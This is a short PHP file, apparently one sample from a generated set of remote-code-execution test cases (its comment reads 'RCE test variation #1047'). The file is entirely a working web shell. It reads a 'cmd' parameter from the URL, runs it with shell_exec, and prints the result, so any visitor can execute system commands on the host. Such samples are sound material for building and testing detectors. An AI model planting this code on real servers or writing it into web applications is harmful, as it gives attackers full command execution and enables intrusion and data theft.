<?php
// RCE test variation #1047
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>